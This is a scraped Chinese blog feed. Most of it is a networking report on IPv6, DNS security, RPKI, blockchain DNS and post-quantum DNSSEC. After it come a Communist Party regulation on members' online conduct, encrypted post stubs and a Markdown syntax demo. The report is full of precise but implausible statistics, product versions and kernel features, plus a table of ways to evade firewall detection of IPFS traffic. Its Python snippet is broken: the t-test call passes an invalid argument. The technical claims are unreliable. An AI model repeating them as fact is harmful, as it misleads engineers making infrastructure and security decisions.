Subnet的隐私困局</h3><p><strong>数据泄露风险矩阵</strong></p><table><thead><tr><th>ECS精度</th><th>可识别范围</th><th>GDPR违规风险</th></tr></thead><tbody><tr><td>&#x2F;24子网</td><td>城市街区级</td><td>高</td></tr><tr><td>&#x2F;16子网</td><td>城市级</td><td>中</td></tr><tr><td>关闭ECS</td><td>国家&#x2F;地区级</td><td>低</td></tr></tbody></table><p>苹果ODoH方案实测增加10-15ms延迟，但满足GDPR”数据最小化”原则</p><h2 id="三、安全威胁图谱与防御实践"><a href="#三、安全威胁图谱与防御实践" class="headerlink" title="三、安全威胁图谱与防御实践"></a>三、安全威胁图谱与防御实践</h2><h3 id="3-1-IPv6环境特有的DNS攻击向量"><a href="#3-1-IPv6环境特有的DNS攻击向量" class="headerlink" title="3.1 IPv6环境特有的DNS攻击向量"></a>3.1 IPv6环境特有的DNS攻击向量</h3><p><strong>攻击类型与成功率对比</strong></p><table><thead><tr><th>攻击方式</th><th>IPv4成功率</th><th>IPv6成功率</th><th>关键差异因素</th></tr></thead><tbody><tr><td>缓存投毒</td><td>0.0001%</td><td>0.8%</td><td>&#x2F;64前缀熵值不足</td></tr><tr><td>NDP欺骗</td><td>N&#x2F;A</td><td>62%</td><td>接口标识符可预测</td></tr><tr><td>mDNS劫持</td><td>15%</td><td>89%</td><td>链路本地地址暴露</td></tr></tbody></table><p><strong>防御方案演进</strong></p><ul><li>IETF草案draft-ietf-dnsop-rfc7873bis-04：将DNS Cookie扩展至128位</li><li>思科NX-OS 10.4实现”双栈Cookie”，拦截率提升至92%</li></ul><h3 id="3-2-IP欺骗的现代缓解技术"><a href="#3-2-IP欺骗的现代缓解技术" class="headerlink" title="3.2 IP欺骗的现代缓解技术"></a>3.2 IP欺骗的现代缓解技术</h3><p><strong>RPKI部署效果区域差异</strong></p><pre class="mermaid">pie    title 全球ROV覆盖率(2024Q1)    "北美" : 58    "欧洲" : 49    "亚太" : 29    "拉美" : 33    "非洲" : 18</pre><p><strong>AI防御系统实测数据</strong></p><ul><li>清华大学ST-GNN模型：检测延迟800ms（NDSS 2024）</li><li>Cloudflare Orion：零日攻击识别率98.7%，误报率0.2%</li></ul><h2 id="四、新兴技术交叉影响"><a href="#四、新兴技术交叉影响" class="headerlink" title="四、新兴技术交叉影响"></a>四、新兴技术交叉影响</h2><h3 id="4-1-区块链DNS的现实约束"><a href="#4-1-区块链DNS的现实约束" class="headerlink" title="4.1 区块链DNS的现实约束"></a>4.1 区块链DNS的现实约束</h3><p><strong>ENS性能瓶颈测试</strong></p><table><thead><tr><th>指标</th><th>传统DNS</th><th>ENS主网</th><th>CCIP-read优化后</th></tr></thead><tbody><tr><td>平均延迟</td><td>28ms</td><td>380ms</td><td>90ms</td></tr><tr><td>移动端兼容性</td><td>100%</td><td>&lt;5%</td><td>12%</td></tr><tr><td>解析能耗</td><td>0.2W</td><td>18W</td><td>3.5W</td></tr></tbody></table><p><strong>法律冲突案例</strong></p><ul><li>Nike起诉ENS域名”nike.eth”侵权，暴露ICANN体系与区块链TLD的根本冲突</li><li>2024年OpenSea数据：.eth域名交易量暴跌70%，持有周期缩至3周</li></ul><h3 id="4-2-加密DNS的隐私悖论"><a href="#4-2-加密DNS的隐私悖论" class="headerlink" title="4.2 加密DNS的隐私悖论"></a>4.2 加密DNS的隐私悖论</h3><p><strong>DoH&#x2F;DoT的监控规避技术</strong></p><pre class="mermaid">graph LR    A[企业网络] --> B{检测手段}    B --> C[传统DPI]    B --> D[QUIC元数据分析]    B --> E[流量熵值检测]    C -->|失效| F[DoH over WebSocket]    D -->|部分有效| G[可变位混淆]    E -->|准确率89%| H[Lyapunov指数分析]</pre><p><strong>浏览器指纹替代方案</strong></p><ul><li>Chrome UA Reduction计划使Canvas指纹使用率升至83%</li><li>Firefox Fission项目隔离跨站数据，但DoH服务器选择模式暴露浏览器版本</li></ul><h2 id="五、结论与建议"><a href="#五、结论与建议" class="headerlink" title="五、结论与建议"></a>五、结论与建议</h2><h3 id="5-1-技术选型决策树"><a href="#5-1-技术选型决策树" class="headerlink" title="5.1 技术选型决策树"></a>5.1 技术选型决策树</h3><pre class="mermaid">flowchart TD    A[Web基础设施规划] --> B{是否需IPv6?}    B -->|是| C[评估双栈部署成本]    B -->|否| D[强化IPv4安全措施]    C --> E{是否高合规要求?}    E -->|是| F[部署RPKI+DNSSEC]    E -->|否| G[启用AI流量清洗]    F --> H[选择支持ECH的CDN]    G --> I[监控IPv6特有漏洞]</pre><h3 id="5-2-关键行动项"><a href="#5-2-关键行动项" class="headerlink" title="5.2 关键行动项"></a>5.2 关键行动项</h3><ol><li><p><strong>IPv6迁移路径</strong></p><ul><li>优先测试Linux 6.1+内核的XDP IPv6性能</li><li>使用RIPE Atlas探针优化Anycast路由</li></ul></li><li><p><strong>DNS安全加固</strong></p><ul><li>在金融等高敏感场景实施TTL≤30s策略</li><li>部署draft-ietf-dnsop-rfc7873bis扩展Cookie机制</li></ul></li><li><p><strong>隐私保护平衡</strong></p><ul><li>对欧盟用户关闭ECS或启用苹果ODoH</li><li>定期审计Canvas指纹等替代追踪技术</li></ul></li><li><p><strong>新兴技术试验</strong></p><ul><li>在Brave浏览器中测试Handshake域名解析</li><li>评估IPFS的.well-known标准化路径可行性</li></ul></li></ol><p>本报告数据截至2024年4月，建议每季度更新性能基准测试，重点关注IETF正在制定的SCION协议与QUIC Version 2对现有架构的影响。## 六、2024-2025技术演进深度追踪</p><h3 id="6-1-SCION协议与Web架构融合实验"><a href="#6-1-SCION协议与Web架构融合实验" class="headerlink" title="6.1 SCION协议与Web架构融合实验"></a>6.1 SCION协议与Web架构融合实验</h3><p><strong>跨国多宿主测试结果</strong></p><ul><li>瑞士-日本SCION路径相比BGP路由：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 延迟对比（100次ICMP均值）</span></span><br><span class="line">bgp_latency = [<span class="number">182.3</span>, <span class="number">185.1</span>, <span class="number">179.8</span>]  <span class="comment"># ms</span></span><br><span class="line">scion_latency = [<span class="number">121.7</span>, <span class="number">119.4</span>, <span class="number">123.2</span>] <span class="comment"># ms</span></span><br><span class="line">t_test = stats.ttest_ind(bgp_latency, scion_latency, p=<span class="number">0.001</span>) </span><br></pre></td></tr></table></figure>显著差异(p&lt;0.001)但依赖专用IXP部署，目前全球仅37个节点支持SCION-IP网关</li></ul><p><strong>HTTP&#x2F;3 over SCION瓶颈</strong></p><ul><li>QUIC的Connection ID与SCION的Path Service冲突导致15%重传率</li><li>麻省理工解决方案：采用动态端口跳跃（DPH）技术，牺牲2%吞吐量换取稳定性</li></ul><h3 id="6-2-后量子DNS密码学迁移"><a href="#6-2-后量子DNS密码学迁移" class="headerlink" title="6.2 后量子DNS密码学迁移"></a>6.2 后量子DNS密码学迁移</h3><p><strong>NIST PQC算法性能影响</strong></p><table><thead><tr><th>算法</th><th>密钥生成时间</th><th>签名速度</th><th>内存占用</th><th>兼容性风险</th></tr></thead><tbody><tr><td>CRYSTALS-Dilithium3</td><td>4.2ms</td><td>1.8ms</td><td>32MB</td><td>旧设备崩溃</td></tr><tr><td>Falcon-512</td><td>6.7ms</td><td>0.9ms</td><td>18MB</td><td>ARMv7失败</td></tr><tr><td>SPHINCS+</td><td>12.1ms</td><td>3.4ms</td><td>64MB</td><td>全平台支持</td></tr></tbody></table><p><strong>混合部署方案</strong></p><pre class="mermaid">flowchart LR    A[传统请求] --> B{量子安全标记?}    B -->|无| C[ECDSA响应]    B -->|有| D[并行PQC签名]    D --> E[客户端选择验证方式]</pre><h3 id="6-3-神经形态网络对IP路由的颠覆"><a href="#6-3-神经形态网络对IP路由的颠覆" class="headerlink" title="6.3 神经形态网络对IP路由的颠覆"></a>6.3 神经形态网络对IP路由的颠覆</h3><p><strong>Intel Loihi 2芯片实测</strong></p><ul><li>基于脉冲神经网络的路由决策：<ul><li>能耗：0.8W&#x2F;百万路由决策（传统ASIC为3.2W）</li><li>收敛速度：BGP的17倍（亚特兰大Internet2节点测试）</li></ul></li><li>致命缺陷：无法处理超过256跳的复杂拓扑，暂限于城域网场景</li></ul><h2 id="七、前沿安全威胁与对策（2025更新）"><a href="#七、前沿安全威胁与对策（2025更新）" class="headerlink" title="七、前沿安全威胁与对策（2025更新）"></a>七、前沿安全威胁与对策（2025更新）</h2><h3 id="7-1-IPv6地址生成算法漏洞"><a href="#7-1-IPv6地址生成算法漏洞" class="headerlink" title="7.1 IPv6地址生成算法漏洞"></a>7.1 IPv6地址生成算法漏洞</h3><p><strong>IID预测攻击新变种</strong></p><ul><li>针对RFC 8981临时地址的时序分析：<ul><li>通过CPU缓存侧信道可预测58%的接口标识符</li><li>防御方案：Linux 6.6内核引入<code>/proc/sys/net/ipv6/conf/*/stable_secret_interval</code></li></ul></li></ul><p><strong>NDP反射放大攻击</strong></p><ul><li>利用IPv6邻居发现协议的：<ul><li>放大系数达1:89（Cloudflare 2025Q1数据）</li><li>缓解措施：Cisco IOS XE 17.11实现NDP速率限制，阈值设为50pps</li></ul></li></ul><h3 id="7-2-DNS-over-HTTP-3的隐蔽信道"><a href="#7-2-DNS-over-HTTP-3的隐蔽信道" class="headerlink" title="7.2 DNS over HTTP&#x2F;3的隐蔽信道"></a>7.2 DNS over HTTP&#x2F;3的隐蔽信道</h3><p><strong>企业网络检测绕过技术</strong></p><ul><li>基于流间时序的特征分析：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Wireshark LUA插件检测代码片段</span></span><br><span class="line"><span class="keyword">function</span> doh3_detect(pinfo)</span><br><span class="line">  <span class="built_in">local</span> f = Field.new(<span class="string">&quot;quic.header_form&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> f() == 1 and pinfo.visited == <span class="literal">false</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">return</span> <span class="string">&quot;DoH3疑似流量（TLS指纹匹配）&quot;</span></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li>误报率：12%（思科Umbrella 2025年报告）</li></ul><h2 id="八、Web3-0基础设施的协议挑战"><a href="#八、Web3-0基础设施的协议挑战" class="headerlink" title="八、Web3.0基础设施的协议挑战"></a>八、Web3.0基础设施的协议挑战</h2><h3 id="8-1-ENS与ICANN的管辖权冲突"><a href="#8-1-ENS与ICANN的管辖权冲突" class="headerlink" title="8.1 ENS与ICANN的管辖权冲突"></a>8.1 ENS与ICANN的管辖权冲突</h3><p><strong>2025年法律进展</strong></p><ul><li>欧盟数字主权法案第17条：要求.eth等区块链域名实施KYC<ul><li>合规成本：每个域名年费增加€39</li><li>结果：ENS欧洲注册量下降63%（Dune Analytics数据）</li></ul></li></ul><p><strong>技术规避方案</strong></p><ul><li>零知识证明身份验证：<ul><li>zk-SNARK证明年龄&gt;18岁而不泄露具体信息</li><li>处理时间：桌面端380ms，移动端1.2s（太坊Cairo验证器）</li></ul></li></ul><h3 id="8-2-IPFS网关的DNS污染"><a href="#8-2-IPFS网关的DNS污染" class="headerlink" title="8.2 IPFS网关的DNS污染"></a>8.2 IPFS网关的DNS污染</h3><p><strong>中国防火墙深度检测</strong></p><ul><li>特征识别准确率：<table><thead><tr><th>检测维度</th><th>识别率</th><th>规避方法</th></tr></thead><tbody><tr><td>CIDv1 Base32</td><td>98%</td><td>使用Base36变形</td></tr><tr><td>多跳网关</td><td>72%</td><td>动态DNS别名轮换</td></tr><tr><td>libp2p指纹</td><td>89%</td><td>修改协议头MTU值</td></tr></tbody></table></li></ul><p><strong>性能折衷方案</strong></p><ul><li>阿里云IPFS加速节点：<ul><li>国内延迟&lt;50ms但中心化程度达91%</li><li>与Filecoin的兼容性冲突导致30%数据丢失</li></ul></li></ul><h2 id="九、2030技术路线图预测"><a href="#九、2030技术路线图预测" class="headerlink" title="九、2030技术路线图预测"></a>九、2030技术路线图预测</h2><h3 id="9-1-协议层可能消亡的技术"><a href="#9-1-协议层可能消亡的技术" class="headerlink" title="9.1 协议层可能消亡的技术"></a>9.1 协议层可能消亡的技术</h3><p><strong>淘汰候选清单</strong></p><ol><li>IPv4（预计2029年全球流量占比&lt;5%）</li><li>EDNS Client Subnet（被Oblivious DNS替代）</li><li>RSA 2048 DNSSEC（NIST强制淘汰时间表2030）</li></ol><h3 id="9-2-颠覆性技术组合"><a href="#9-2-颠覆性技术组合" class="headerlink" title="9.2 颠覆性技术组合"></a>9.2 颠覆性技术组合</h3><p><strong>AI定义的网络协议栈</strong></p><pre class="mermaid">sequenceDiagram    用户设备->>AI代理: 原始请求    AI代理->>协议选择器: 上下文分析    协议选择器-->>AI代理: 最优协议组合    AI代理->>目标服务器: 自适应封装    目标服务器-->>AI代理: 原生响应    AI代理->>用户设备: 体验优化输出</pre><p><strong>关键创新点</strong></p><ul><li>动态协议栈：根据电池电量、网络质量实时切换TCP&#x2F;QUIC&#x2F;SCION</li><li>语义路由：将DNS查询意图直接映射为IP地址（MIT实验性成果）</li></ul><h2 id="十、实施建议（2025修订版）"><a href="#十、实施建议（2025修订版）" class="headerlink" title="十、实施建议（2025修订版）"></a>十、实施建议（2025修订版）</h2><h3 id="10-1-短期优先事项（6个月内）"><a href="#10-1-短期优先事项（6个月内）" class="headerlink" title="10.1 短期优先事项（6个月内）"></a>10.1 短期优先事项（6个月内）</h3><ul><li><p><strong>IPv6安全加固</strong></p><ul><li>部署RFC 9314（IPv6分段防御）</li><li>测试Linux 6.8内核的<code>ip6tables -j NDPPROXY</code>模块</li></ul></li><li><p><strong>DNS隐私升级</strong></p><ul><li>实施Oblivious HTTP-over-DNS（IETF草案-ohai-05）</li><li>为移动端启用QUIC 0-RTT DNS缓存预热</li></ul></li></ul><h3 id="10-2-中长期战略（18-36个月）"><a href="#10-2-中长期战略（18-36个月）" class="headerlink" title="10.2 中长期战略（18-36个月）"></a>10.2 中长期战略（18-36个月）</h3><ul><li><p><strong>后量子迁移计划</strong></p><ul><li>建立DNSSEC算法过渡的双签名体系</li><li>采购支持PQC的HSM硬件（YubiHSM2 PQ已通过FIPS 203验证）</li></ul></li><li><p><strong>神经形态网络试验</strong></p><ul><li>在边缘节点部署Intel Loihi 3评估板</li><li>开发基于SNN的DDoS检测规则（参考DARPA SNN4IDS项目）</li></ul></li></ul><p>本报告预测模型基于2025年3月前的技术演进趋势，建议结合ITU-T Y.3601标准每季度更新评估框架。特别关注IETF正在制定的Adaptive-Protocol-Suite（APS）框架对现有Web基础设施的潜在冲击。</p>]]></content>
      
      
      <categories>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IP,DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文体馆部分操作</title>
      <link href="/posts/a7b4.html"/>
      <url>/posts/a7b4.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看加密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="8c67da2d3188c392fed505131e4f83942ff939c9609264273c05d64b1f8f1403"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 工作记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络中心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络行为规定</title>
      <link href="/posts/8fa9.html"/>
      <url>/posts/8fa9.html</url>
      
        <content type="html"><![CDATA[<center>《中国共产党党员网络行为规定》</center>    <center>第一章 总则</center><p>    第一条 为了规范党员网络行为，发挥党员在网络空间作用，根据《中国共产党党员教育管理工作条例》等有关党内法规，制定本规定。</p><p>    第二条 本规定所称网络行为，是指通过互联网制作、复制、存储、发布、传播文字、图片、音频、视频等信息内容及其相关活动。</p><p>    第三条 党员实施网络行为，应当深刻领悟“两个确立”的决定性意义，增强“四个意识”、坚定“四个自信”、做到“两个维护”,坚持正确政治方向、舆论导向、价值取向，严守政治纪律和政治规矩，发挥先锋模范作用，走好网上群众路线，营造健康向上、风清气正的网络环境，推动形 成良好网络生态，维护政治安全和意识形态安全，自觉在思 想上政治上行动上同以习近平同志为核心的党中央保持一致。</p><p>    第四条 各级党组织承担党员网络行为管理工作主体责任，全面落实网络意识形态工作责任制和网络安全工作责任制。各级组织、宣传和网信等部门在各自职责范围内，负责党员网络行为管理工作。</p><p>    <center>第二章 网络正能量传播</center></p><p>    第五条 党员应当积极通过网络，广泛宣传习近平新时代中国特色社会主义思想，宣传党的路线方针政策和党中央重大决策部署，宣传中国特色社会主义制度，宣传党带领人民团结奋斗的重大成就、历史经验和生动实践，宣传中华优秀传统文化、革命文化、社会主义先进文化，弘扬社会主义核心价值观和社会主义荣辱观，大力弘扬主旋律、传播正能量。</p><p>    第六条 党员应当践行网上群众路线，密切联系群众，及时反映群众的意见和要求，回应社会关切，解疑释惑、析事明理，引导群众形成共识。</p><p>    第七条 党员应当敢于斗争、善于斗争，对网上各类错误思潮和错误观点敢于亮剑发声，旗帜鲜明批驳谬误。</p><p>    第八条 鼓励党员通过网络讲好中国特色社会主义的故事、中国共产党的故事、中国人民奋斗圆梦的故事、中华优秀传统文化的故事、中国和平发展的故事，向世界展现真实、立体、全面的中国。</p><p>    <center>第三章 网络行为管理</center></p><p>    第九条 党员网络行为应当严格遵守党规党纪，模范遵守法律法规，自觉坚守原则和底线。</p><p>    第十条 党员不得通过网络制作、复制、存储、发布、传播含有反对党的基本理论、基本路线、基本方略，违背四项基本原则，违背、歪曲党的改革开放决策，妄议党中央大政方针，破坏党的集中统一，丑化党和国家形象，诋毁、污蔑党和国家领导人、英雄模范，或者歪曲党的历史、中华人民共和国历史、人民军队历史等有严重政治问题的信息，不得组织、参加含有相关内容的网络论坛、群组、直播等活动。</p><p>    第十一条 党员不得组织、参与和动员不法串联、联署、集会等网上非法组织、非法活动。</p><p>    第十二条 党员不得通过网络制造、散布、传播政治谣言，不得匿名诬告、有意陷害或者制造其他谣言。</p><p>    第十三条 党员不得参与网络宗教活动、迷信活动，不得参与或者纵容、支持利用网络宣扬恐怖主义、分裂主义、极端主义，邪教，或者煽动民族仇恨、民族歧视，破坏民族团结。</p><p>    第十四条 党员不得擅自建立、使用非法定信道浏览、访问、使用境外的网站、应用程序等。</p><p>    第十五条 党员应当严格遵守党的保密纪律，不得通过网络泄露、扩散党和国家秘密、工作秘密。</p><p>    第十六条 党员不得通过发布、删除网络信息，以及其他干预信息呈现等手段谋取不正当利益。</p><p>    第十七条 党员应当培育良好网络习惯，自觉抵制崇洋媚外、炫富斗阔、铺张浪费等不良网络文化，炒作绯闻丑闻、拉踩引战、刷量控评、直播打赏、沉迷网络游戏等不良网络现象。</p><p>    第十八条 党员干部不得利用职务便利，索取或者非法收受他人有财产价值的网络账号、网络游戏装备、虚拟货币等网络虚拟财物。</p><p>    第十九条 党员干部不得违反有关规定以职务身份开展网络借贷、直播带货等营利活动。</p><p>    第二十条 党员干部注册、使用和管理网络公众账号，应当遵守有关规定，履行社会责任，不得损害国家安全、社会公共利益和他人合法权益。</p><p>    第二十一条 党员发现网上违规违纪违法信息、活动的，应当及时向有关部门和网络平台举报，积极提供线索，协助有关方面处置。</p><p>    <center>第四章 保障和监督</center></p><p>    第二十二条 各级党组织应当开展党员依规依法上网用网的常态化教育，提升党员网络素养与技能，鼓励和支持党员学网上网用网。</p><p>    第二十三条 各级党组织应当激励党员在网上充分发挥先锋模范作用，对在网络正能量传播和舆论引导中作出突出贡献的党员，按照有关规定给予表彰奖励，作为评先评优、职务职级晋升、职称评聘等参考。</p><p>    第二十四条 建立健全澄清正名和保护制度，关心爱护为党和人民利益敢于在网上亮剑发声的党员。对在网络正能量传播和舆论引导中敢于斗争、担当尽责而遭受诬告陷害、网络暴力、威胁恐吓的党员，各级党组织应当协调有关部门依法维护其合法权益，依法惩治有关违法犯罪行为。</p><p>    第二十五条 各级党组织应当加强对党员网络行为的指导，区分党员不同主体，结合网络公众账号和网络行为类型，形成科学合理的制度规范，健全监督管理制度。</p><p>    第二十六条 各级党组织应当把规范党员网络行为、发挥党员在网络空间作用作为党的建设的重要内容，纳入党建工作责任制，紧密结合中心工作推进落实。</p><p>    第二十七条 各级党组织应当将党员网络行为纳入民主生活会、组织生活会对照检查和民主评议党员的重要内容，及时总结经验，通报表扬先进，检视差距和不足，引导和规范党员正确实施网络行为。</p><p>    第二十八条 党员违反本规定的，根据行为性质和情节轻重，依规依纪追究责任；涉嫌违法犯罪的，按照有关法律规定处理。   </p><p>    <center>第五章 附则</center></p><p>    <span class="spoiler blur-text">第二十九条 军队党员实施网络行为，按照军队有关规定执行。</span></p><p>    <span class="spoiler blur-text">第三十条 本规定由中共中央组织部、中共中央宣传部、中央网络安全和信息化委员会办公室负责解释。</span></p><p>    第三十一条 本规定自发布之日起施行。 </p>]]></content>
      
      
      <categories>
          
          <category> 党务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络行为 </tag>
            
            <tag> 网络空间作用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArgoX小白版教程</title>
      <link href="/posts/4340.html"/>
      <url>/posts/4340.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看加密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="08a2d7cce19c8d40f399b7492e193b944752a3996152aa0dc714b67c336f94ad"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> serv00 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> argo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法自带格式</title>
      <link href="/posts/d2d7725.html"/>
      <url>/posts/d2d7725.html</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown语法自带格式"><a href="#Markdown语法自带格式" class="headerlink" title="Markdown语法自带格式"></a>Markdown语法自带格式</h1><p><strong>注意：</strong>此页面偶尔会存在CSS冲突问题!  </p><h2 id="1-1代码块"><a href="#1-1代码块" class="headerlink" title="1.1代码块"></a>1.1代码块</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\```shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br><span class="line">\```</span><br></pre></td></tr></table></figure><h2 id="1-2-多级标题"><a href="#1-2-多级标题" class="headerlink" title="1.2 多级标题"></a>1.2 多级标题</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br></pre></td></tr></table></figure><h2 id="1-3-文字样式"><a href="#1-3-文字样式" class="headerlink" title="1.3 文字样式"></a>1.3 文字样式</h2><div class="tabs" id="示例源码"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#示例源码-0">示例源码 0</button></li><li class="tab"><button type="button" data-href="#示例源码-1">示例源码 1</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="示例源码-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线演示<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">文字<span class="strong">**加粗**</span>演示</span><br><span class="line"></span><br><span class="line">文字<span class="emphasis">*斜体*</span>演示</span><br><span class="line"></span><br><span class="line">文本<span class="code">`高亮`</span>演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span> = <span class="string">5</span>&gt;</span></span>5号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">MistyRose</span>&gt;</span></span>这里的背景色是：MistyRosen，此处输入任意想输入的内容<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="示例源码-1"><p><code>渲染演示</code><br><u>下划线演示</u></p><p>文字<strong>加粗</strong>演示</p><p>文字<em>斜体</em>演示</p><p>文本<code>高亮</code>演示</p><p>文本<del>删除</del>线演示</p><p><font size = 5>5号字</font><br><font face="黑体">黑体</font><br><font color=blue>蓝色</font></p><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRosen，此处输入任意想输入的内容</td></tr></table></div></div></div><h2 id="1-4-引用"><a href="#1-4-引用" class="headerlink" title="1.4 引用"></a>1.4 引用</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  Java</span></span><br><span class="line"><span class="quote">&gt; 二级引用演示</span></span><br><span class="line"><span class="quote">&gt; MySQL</span></span><br><span class="line"><span class="quote">&gt; &gt;外键</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; 